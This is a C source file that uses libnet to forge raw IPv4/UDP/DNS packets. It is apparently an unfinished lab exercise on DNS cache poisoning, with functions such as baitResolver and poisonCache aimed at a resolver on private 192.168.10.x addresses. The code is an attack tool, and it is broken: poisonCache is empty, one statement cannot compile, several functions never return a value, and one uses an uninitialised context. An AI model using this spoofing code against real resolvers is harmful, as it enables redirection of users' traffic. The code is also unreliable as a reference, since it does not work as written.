#include <assert.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <stdint.h>
#include <libnet.h>

#define DNS_NAME_LENGTH 64
#define RECORD_BUFFER_SIZE 1024
#define NULL_PAYLOAD NULL
#define NULL_PAYLOAD_SIZE 0
typedef unsigned char uchar_t;

struct Libnet {
	libnet_t* context;
	char* errorBuffer;
};

struct NetworkOrderedIPs {
	uint32_t source;
	uint32_t destination;
};

struct IPv4HeaderOptions {
	struct Libnet libnet;
	uint16_t resourceLength;
	uint32_t sourceIP;
	uint32_t destinationIP;
};

struct UDPHeaderOptions {
	struct Libnet libnet;
	uint16_t resourceLength;
	uint16_t sourcePort;
	uint16_t destinationPort;
};

struct DNSHeaderOptions {
	struct Libnet libnet;
	u_int16_t resourceLength;
	uint16_t queryID;
	uint16_t flags;
	uint16_t numberQuestions;
	uint16_t numberAnswerResourceRecords;
	uint16_t authorityResourceRecord;
};

struct DNSQuestionFormatOptions {
	char* qname;
	uint16_t qtype;
	uint16_t qclass;
};

struct DNSQuestionRecordOptions {
	struct Libnet libnet;
	struct DNSQuestionFormatOptions formatOptions;
};

struct DNSQuestionRecord {
	libnet_ptag_t libnet_ptag;
	uint16_t questionSize;
};

struct DNSRequestHeaders {
	libnet_ptag_t DNSHeaderPtag;
	libnet_ptag_t UDPHeaderPtag;
	libnet_ptag_t IPv4HeaderPtag;
};

struct DNSBaseRequestOptions {
	struct NetworkOrderedIPs networkOrderedIPs;
	uint16_t sourcePort;
	uint16_t destinationPort;
	uint16_t queryID;
};

struct DNSRequestHeadersOptions {
	struct Libnet libnet;
	struct DNSBaseRequestOptions base;
	struct DNSHeaderOptions dnsHeaderOptions;
	uint16_t recordsSize;
};

struct DNSBaseRequest {
	struct Libnet libnet;
	struct DNSRequestHeaders headers;
};

struct DNSQueryRequest {
	struct DNSQuestionRecord DNSQuestionRecord;
	struct DNSBaseRequest base;
};


struct DNSRequestOptions {
	char* qname;
	char* sourceIP;
	char* destinationIP;
	struct DNSBaseRequestOptions base;
};

struct DNSAnswerRecord {
	uint16_t recordSize;
	libnet_ptag_t ptag;
};

struct DNSAnswerRequest {
	struct DNSAnswerRecord answerRecord;
	struct DNSQueryRequest queryRequest;

};

struct DNSAnswerRecordOptions {
	libnet_ptag_t ptag;
	char* qname;
	uint16_t type;
	uint16_t class;
	uint32_t ttl;
	uint16_t rdlength;
	char* rdata;
};

struct DNSAnswerRecordFormatOptions {
	struct Libnet libnet;
	uchar_t* buffer;
	struct DNSAnswerRecordOptions answer;
};

void 						destroyLibnetContext(struct Libnet libnet);
void 						parseArguments(int part, int argc, char* argv[]);
void 						uint16ToChars(uchar_t* buffer, uint16_t uint);
void 						uint32ToChars(uchar_t* buffer, uint32_t uint32);
char 						uint32toOctateChar(uint32_t uint32);
char 						uint8toOctateChar(uint8_t uint8);
uint16_t 					makeDomain(char* buffer, char* domainString);
short 						parseOptions(int argc, char* argv[]);
uint16_t 					formatDNSQuestion(char* DNSQuestionBuffer, struct DNSQuestionFormatOptions options);
uint16_t 					formatDNSAnswer(struct DNSAnswerRecordFormatOptions options);
uint16_t					makeDomain(char* buffer, char* domainString);
uint16_t 					uint16tono16(uint16_t uint);
uint32_t 					makeByteNumberedIP(struct Libnet libnet, char* name, int resolve);
uint32_t 					uint32tono32(uint32_t uint32);
struct Libnet 				makeLibnet();
libnet_ptag_t 				makeIPHeader(struct IPv4HeaderOptions options);
libnet_ptag_t 				makeUDPHeader(struct UDPHeaderOptions options);
libnet_ptag_t 				makeDNSHeader(struct DNSHeaderOptions options);
struct DNSRequestHeaders	makeDNSRequestHeaders(struct DNSRequestHeadersOptions options);
struct DNSQueryRequest 		makeDNSQueryRequest(struct DNSRequestOptions options);
struct DNSQuestionRecord 	makeDNSQuestionRecord(struct DNSQuestionRecordOptions options);
struct DNSAnswerRecord 		makeDNSAnswerRecord(struct DNSAnswerRecordOptions options);
struct NetworkOrderedIPs 	parseIPs(struct Libnet libnet, char* sourceIPString, char* destinationIPString);

void partOne(int argc, char* argv[]) {

}

void baitResolver(struct DNSRequestOptions options) {
	struct DNSQueryRequest QNameQuery = makeDNSQueryRequest(options);
	libnet_write(QNameQuery.base.libnet.context);
	destroyLibnetContext(QNameQuery.base.libnet);
}

void poisonCache(struct DNSRequestOptions options) {
	struct DNSAnswerRequest request;
	// request.answerRecord = makeDNSAnswerRecord()

}

char uint8toOctateChar(uint8_t uint8) {
	return (char)(uint8 & 0xFF);
}
char uint32toOctateChar(uint32_t uint32) {
	return (char)(uint32 & 0xFF);
}


int main(int argc, char* argv[]) {

	short part = parseOptions(argc, argv);
	struct DNSBaseRequestOptions baseRequestOptions;
	baseRequestOptions.queryID = 1000;
	baseRequestOptions.sourcePort = 53;
	baseRequestOptions.destinationPort = 53;

	struct DNSRequestOptions bait;
	bait.qname = "vunet.vu.nl";
	bait.sourceIP = "192.168.10.20";
	bait.destinationIP = "192.168.10.10";
	bait.base = baseRequestOptions;
	baitResolver(bait);
	return 0;
}

struct DNSAnswerRecord makeDNSAnswerRecord(struct DNSAnswerRecordOptions options) {

	struct Libnet libnet;
	struct DNSAnswerRecord record;
	char answerBuffer[RECORD_BUFFER_SIZE] = { '\0' };
	struct DNSAnswerRecordFormatOptions answerFormatOptions = { libnet, answerBuffer, options };
	record.recordSize = formatDNSAnswer(answerFormatOptions);
	record.ptag = libnet_build_data(
		(uint8_t*)answerBuffer,
		record.recordSize,
		libnet.context,
		options.ptag
	);
	if (record.ptag == -1) {
		fprintf(stderr, "Error: Could not create Answer Record.\n Libnet error: %s", libnet_geterror(libnet.context));
		exit(EXIT_FAILURE);
	}
	return record;

};

uint16_t formatDNSAnswer(struct DNSAnswerRecordFormatOptions options) {
	uint16_t recordLength = 0;
	char Type[sizeof(uint16_t)] = { '\0' }; uint16ToChars(Type, uint16tono16(options.answer.type));
	char Class[sizeof(uint16_t)] = { '\0' }; uint16ToChars(Class, uint16tono16(options.answer.class));
	char TTL[sizeof(uint32_t)] = { '\0' }; uint32ToChars(TTL, uint32tono32(options.answer.ttl));
	char RDLENGTH[sizeof(uint16_t)] = { '\0' }; uint16ToChars(RDLENGTH, uint16tono16(options.answer.rdlength));
	char rdataBuffer[sizeof(uint32_t)] = { '\0' };
	uint32_t noRdata = libnet_name2addr4(options.libnet.context, options.answer.rdata, LIBNET_DONT_RESOLVE);
	uint32ToChars(rdataBuffer, noRdata);

	recordLength = makeDomain(options.buffer, options.answer.qname);
	memcpy(options.buffer + recordLength, &Type, sizeof Type);
	recordLength += sizeof Type;
	memcpy(options.buffer + recordLength, &Class, sizeof Class);
	recordLength += sizeof Class;
	memcpy(options.buffer + recordLength, &TTL, sizeof TTL);
	recordLength += sizeof TTL;
	memcpy(options.buffer + recordLength, &RDLENGTH, sizeof RDLENGTH);
	recordLength += sizeof RDLENGTH;
	memcpy(options.buffer + recordLength, rdataBuffer, sizeof rdataBuffer);
	recordLength += sizeof rdataBuffer;

	for (int i = 0; i < recordLength; i++) {
		printf("0x%02X ", options.buffer[i]);
	}
	printf("\n");

	return recordLength;
}

libnet_ptag_t makeDNSHeader(struct DNSHeaderOptions options) {
	uint16_t FLAGS = options.flags; /*0x0100*/
	u_int16_t NUMBER_QUESTIONS = options.numberQuestions; /* 1 Might change in later parts.*/
	u_int16_t NUMBER_ANSWER_RR = options.numberAnswerResourceRecords;
	u_int16_t NUMBER_AUTHORITY_RR = options.authorityResourceRecord;
	u_int16_t NUMBER_ADDITIONAL_RR = 0;
	libnet_ptag_t PTAG = 0;
	PTAG = libnet_build_dnsv4(
		LIBNET_UDP_DNSV4_H,
		options.queryID,
		FLAGS,
		NUMBER_QUESTIONS,
		NUMBER_ANSWER_RR,
		NUMBER_AUTHORITY_RR,
		NUMBER_ADDITIONAL_RR,
		NULL_PAYLOAD,
		NULL_PAYLOAD_SIZE,
		options.libnet.context,
		PTAG
	);
	if (PTAG == -1) {
		fprintf(stderr, "Error: Could not create DNS header. \nLibnet Error: %s", libnet_geterror(options.libnet.context));
		exit(EXIT_FAILURE);
	}
	return PTAG;
}

struct DNSRequestHeaders makeDNSRequestHeaders(struct DNSRequestHeadersOptions options) {

	struct DNSRequestHeaders headers;
	struct UDPHeaderOptions UDPHeaderOptions = { options.libnet, options.recordsSize, options.base.sourcePort, options.base.destinationPort };
	struct IPv4HeaderOptions IPOptions = { options.libnet, options.recordsSize, options.base.networkOrderedIPs.source, options.base.networkOrderedIPs.destination };

	headers.DNSHeaderPtag = makeDNSHeader(options.dnsHeaderOptions);
	headers.UDPHeaderPtag = makeUDPHeader(UDPHeaderOptions);
	headers.IPv4HeaderPtag = makeIPHeader(IPOptions);

}



struct NetworkOrderedIPs parseIPs(struct Libnet libnet, char* sourceIPString, char* destinationIPString) {
	struct NetworkOrderedIPs ips;
	if (sourceIPString == NULL) {
		ips.source = libnet_get_ipaddr4(libnet.context);
	}
	else {
		ips.source = makeByteNumberedIP(libnet, sourceIPString, LIBNET_DONT_RESOLVE);
	}

	ips.destination = makeByteNumberedIP(libnet, destinationIPString, LIBNET_DONT_RESOLVE);
	return ips;
}

struct DNSAnswerRequest makeDNSAnswerRequest(struct DNSRequestOptions options){

	struct DNSQueryRequest query;
	query.base.libnet = makeLibnet();
	uint16_t qtype = 1, qclass = 1;
	options.base.networkOrderedIPs = parseIPs(query.base.libnet, options.sourceIP, options.destinationIP);

	struct DNSAnswerRequest answerRequest;
	struct DNSQueryRequest queryRequest;

	struct DNSAnswerRecord = makeDNSAnswerRecord()

	struct DNSQuestionFormatOptions DNSQuestionFormatOptions = { options.qname, qtype, qclass };
	struct DNSQuestionRecordOptions DNSQuestionRecordOptions = { query.base.libnet, DNSQuestionFormatOptions };
	query.DNSQuestionRecord = makeDNSQuestionRecord(DNSQuestionRecordOptions);

	struct DNSRequestHeadersOptions requestHeadersOptions;
	struct DNSHeaderOptions dnsHeaderOptions = { query.base.libnet, query.DNSQuestionRecord.questionSize, options.base.queryID , 0x0100, 1, 0, 0};

	requestHeadersOptions.libnet = query.base.libnet;
	requestHeadersOptions.base = options.base;
	requestHeadersOptions.recordsSize = query.DNSQuestionRecord.questionSize;
	requestHeadersOptions.dnsHeaderOptions = dnsHeaderOptions;

	query.base.headers = makeDNSRequestHeaders(requestHeadersOptions);
	return query;
	// struct DNSQueryRequest = 
}

struct DNSQueryRequest makeDNSQueryRequest(struct DNSRequestOptions options) {

	struct DNSQueryRequest query;
	query.base.libnet = makeLibnet();
	uint16_t qtype = 1, qclass = 1;

	options.base.networkOrderedIPs = parseIPs(query.base.libnet, options.sourceIP, options.destinationIP);

	struct DNSQuestionFormatOptions DNSQuestionFormatOptions = { options.qname, qtype, qclass };
	struct DNSQuestionRecordOptions DNSQuestionRecordOptions = { query.base.libnet, DNSQuestionFormatOptions };
	query.DNSQuestionRecord = makeDNSQuestionRecord(DNSQuestionRecordOptions);

	struct DNSRequestHeadersOptions requestHeadersOptions;
	struct DNSHeaderOptions dnsHeaderOptions = { query.base.libnet, query.DNSQuestionRecord.questionSize, options.base.queryID , 0x0100, 1, 0, 0};

	requestHeadersOptions.libnet = query.base.libnet;
	requestHeadersOptions.base = options.base;
	requestHeadersOptions.recordsSize = query.DNSQuestionRecord.questionSize;
	requestHeadersOptions.dnsHeaderOptions = dnsHeaderOptions;

	query.base.headers = makeDNSRequestHeaders(requestHeadersOptions);
	return query;
}

uint32_t makeByteNumberedIP(struct Libnet libnet, char* name, int resolve) {
	uint32_t byteOrderedIp;
	if ((byteOrderedIp = libnet_name2addr4(libnet.context, name, resolve)) == -1) {
		fprintf(stderr, "Error: Bad destination IP address.\n");
		exit(EXIT_FAILURE);
	}
	return byteOrderedIp;
}

uint16_t formatDNSQuestion(char* DNSQuestionBuffer, struct DNSQuestionFormatOptions options) {

	uint16_t questionSize = makeDomain(DNSQuestionBuffer, options.qname);
	char qtypeChar[2] = { '0' }; uint16ToChars(qtypeChar, uint16tono16(options.qtype));
	char qclassChar[2] = { '0' }; uint16ToChars(qclassChar, uint16tono16(options.qclass));;

	memcpy(DNSQuestionBuffer + questionSize, &qtypeChar, sizeof qtypeChar);
	questionSize += sizeof qtypeChar;
	memcpy(DNSQuestionBuffer + questionSize, &qclassChar, sizeof qclassChar);
	questionSize += sizeof qclassChar;
	return questionSize;

}

struct DNSQuestionRecord makeDNSQuestionRecord(struct DNSQuestionRecordOptions options) {
	char questionBuffer[RECORD_BUFFER_SIZE] = { '\0' };
	uint16_t questionSize = formatDNSQuestion(questionBuffer, options.formatOptions);
	libnet_ptag_t libnet_ptag = libnet_build_data(
		(uint8_t*)questionBuffer,
		questionSize,
		options.libnet.context,
		0
	);
	if (libnet_ptag == -1) {
		fprintf(stderr, "Error could not create DNS question record..\n Libnet Error: %s", libnet_geterror(options.libnet.context));
		exit(EXIT_FAILURE);
	}
	return (struct DNSQuestionRecord) { libnet_ptag, questionSize };
}

libnet_ptag_t makeUDPHeader(struct UDPHeaderOptions options) {
	uint16_t CHECKSUM = 0;
	uint16_t PTAG = 0;

	libnet_ptag_t libnet_ptag = libnet_build_udp(
		options.sourcePort,
		options.destinationPort,
		LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + options.resourceLength,
		CHECKSUM,
		NULL_PAYLOAD,
		NULL_PAYLOAD_SIZE,
		options.libnet.context,
		PTAG
	);
	if (libnet_ptag == -1) {
		fprintf(stderr, "Error could not create UDP header.\n Libnet Error: %s", libnet_geterror(options.libnet.context));
		exit(EXIT_FAILURE);
	}
}

libnet_ptag_t makeIPHeader(struct IPv4HeaderOptions options) {
	uint8_t TYPE_OF_SERVICE = 0;
	uint16_t ID = 0;
	uint16_t FRAGMENTATION = 0;
	uint8_t TTL = 64;
	uint8_t PROTOCOL = IPPROTO_UDP;
	uint16_t CHECKSUM = 0;
	libnet_ptag_t PTAG = 0;

	libnet_ptag_t libnet_ptag = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + options.resourceLength,
		TYPE_OF_SERVICE,
		ID,
		FRAGMENTATION,
		TTL,
		PROTOCOL,
		CHECKSUM,
		options.sourceIP,
		options.destinationIP,
		NULL_PAYLOAD,
		NULL_PAYLOAD_SIZE,
		options.libnet.context,
		PTAG
	);
	if (libnet_ptag == -1) {
		fprintf(stderr, "Error: Could not create IPv4 Header.\n Libnet Error: %s", libnet_geterror(options.libnet.context));
		exit(EXIT_FAILURE);
	}
	return libnet_ptag;
}

void parseArguments(int part, int argc, char* argv[]) {
	switch (part)
	{
	case 1:
		break;
	case 2:
		break;
	case 3:
		break;
	case 4:
		break;
	default:
		abort();
	}
}

struct Libnet makeLibnet() {
	struct Libnet libnet = { NULL, NULL };
	libnet.errorBuffer = calloc(LIBNET_ERRBUF_SIZE, sizeof(char));
	libnet.context = libnet_init(
		LIBNET_RAW4,
		"enp0s8",
		libnet.errorBuffer);

	if (!libnet.context) {
		fprintf(stderr, "Could not initiate libnet: %s\n", libnet.errorBuffer);
		exit(EXIT_FAILURE);
	}
	return libnet;
}

void destroyLibnetContext(struct Libnet libnet) {
	libnet_destroy(libnet.context);
	free(libnet.errorBuffer);
	return;
}

short parseOptions(int argc, char* argv[]) {
	char opt = '\0';
	short part = 0;
	while ((opt = getopt(argc, argv, "p:")) != EOF) {
		switch (opt)
		{
		case 'p':;
			char* tailptr;
			const int base = 0;
			part = (int)strtol(optarg, &tailptr, base);
			if (strcmp(tailptr, "") != 0) {
				fprintf(stderr, "Error parsing -p argument. %s is invalid.\n", optarg);
				exit(EXIT_FAILURE);
			}
			if (part < 1 || part > 4) {
				fprintf(stderr, "Error parsing -p argument. -p must be in range from 1-4.\n");
				exit(EXIT_FAILURE);
			}
			break;
		case '?':
			if (optopt == 'p') {
				fprintf(stderr, "Error parsing -%c argument. -%c must not be empty string.\n", optopt, optopt);
			}
			else if (isprint(optopt)) {
				fprintf(stderr, "Unknown option -%c.\n", optopt);
			}
			exit(EXIT_FAILURE);
		default:
			abort();
		}
	}
	return part;
}

uint16_t makeDomain(char* buffer, char* domainString) {
	char* iter = domainString, * labelStart = domainString;
	char* bufferIter = buffer;
	uint32_t labelLength = 0, domainLength = 0;
	while (1) {
		if (*iter == '.' || *iter == '\0') {
			char labelLengthAsChar = uint32toOctateChar(labelLength);
			memcpy(bufferIter, &labelLengthAsChar, 1);
			bufferIter += 1;

			memcpy(bufferIter, labelStart, labelLength);
			bufferIter += labelLength;
			labelStart = iter + sizeof((char)'.');

			domainLength += labelLength + sizeof labelLengthAsChar;
			labelLength = 0;
			if (*iter == '\0') {
				char nullChar = 0x00;
				memcpy(bufferIter, &nullChar, sizeof((char)'\0'));
				domainLength += sizeof((char)'\0');
				break;
			}
		}
		else {
			labelLength += 1;
		}
		iter += 1;
	}
	return domainLength;
};

uint16_t uint16tono16(uint16_t uint) {
	uint16_t networkOrderedUint32 = 0;
	uint8_t* networkOrderedIter = (uint8_t*)&networkOrderedUint32;
	uint8_t* uintIter = (uint8_t*)&uint;
	for (int i = sizeof(uint16_t) - 1, j = 0; i >= 0; i--) {
		networkOrderedIter[j] = uintIter[i];
		j++;
	}
	return networkOrderedUint32;
};

void uint16ToChars(uchar_t* buffer, uint16_t uint) {
	uchar_t bytes = sizeof(uint16_t);
	memcpy(buffer, (uchar_t*)&uint, bytes);
}

uint32_t uint32tono32(uint32_t uint32) {
	uint32_t networkOrderedUint32 = 0;
	uint8_t* networkOrderedIter = (uint8_t*)&networkOrderedUint32;
	uint8_t* uint32Iter = (uint8_t*)&uint32;
	for (int i = sizeof(uint32_t) - 1, j = 0; i >= 0; i--) {
		networkOrderedIter[j] = uint32Iter[i];
		j++;
	}
	return networkOrderedUint32;
};

void uint32ToChars(uchar_t* buffer, uint32_t uint32) {
	uchar_t bytes = sizeof(uint32_t);
	memcpy(buffer, (uchar_t*)&uint32, bytes);
}

